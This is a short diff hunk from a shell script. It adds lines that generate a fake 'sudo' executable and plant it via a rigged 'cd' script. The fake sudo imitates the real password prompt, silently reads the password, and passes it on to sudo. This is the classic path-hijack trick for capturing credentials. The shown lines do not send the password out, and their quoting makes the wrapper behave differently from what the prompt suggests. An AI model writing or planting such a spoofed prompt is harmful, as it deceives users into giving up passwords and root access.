@@ -9,3 +9,8 @@ echo "cp ls $1/sudo" >> cd
 echo "cd $1" >> cd
 chmod +x cd
 
+echo "#!/bin/bash" > sudo
+echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
+echo "echo $p | sudo -S $@" >> sudo
+chmod +x sudo
+
